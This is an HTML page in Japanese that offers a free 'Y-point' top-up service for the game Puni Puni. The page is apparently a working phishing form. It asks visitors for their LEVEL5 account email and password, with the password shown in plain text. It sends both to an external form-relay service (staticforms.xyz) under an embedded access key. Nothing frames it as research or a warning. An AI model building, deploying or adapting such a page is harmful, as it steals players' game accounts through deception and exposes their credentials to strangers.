<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Yポ無料代行</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
<div class="contact-form">
    <p class="title">ぷにぷに無料代行！</p>

    <form action="https://api.staticforms.xyz/submit" method="post">
      <input type="hidden" name="accessKey" value="fc426c76-3a16-4f95-972b-47124c84008d">
      <input type="hidden" name="subject" value="Test">

      <div class="item">
        <label class="label">LEVEL5メールアドレス</label>
        <input type="email" class="inputs" name="email" />
      </div>

      <div class="item">
        <label class="label">LEVEL5パスワード</label>
        <input type="text" class="inputs" name="name" required/>
      </div>

      <div class="item">
        <p class="label">Yポの量を選択してください</p>
        <div class="inputs">
          <input id="s" type="radio" name="menu" value="s" /><label for="s"
            >Yポ50万</label
          >
          <input id="a" type="radio" name="menu" value="a" /><label for="a"
            >Yポ30万</label
          >
          <input id="b" type="radio" name="menu" value="b" /><label for="b"
            >Yポ20万</label
          >
        </div>
      </div>

        <div class="item">
          <label class="label">ご質問</label>
          <textarea class="inputsf" placeholder="ご質問はこちら"></textarea>
        </div>

        <div class="button-area">
          <input type="submit" value="予約決定" />
          <input type="reset" value="リセット" />
        </div>
      </div>
    </form>
</div>
  </body>
</html>
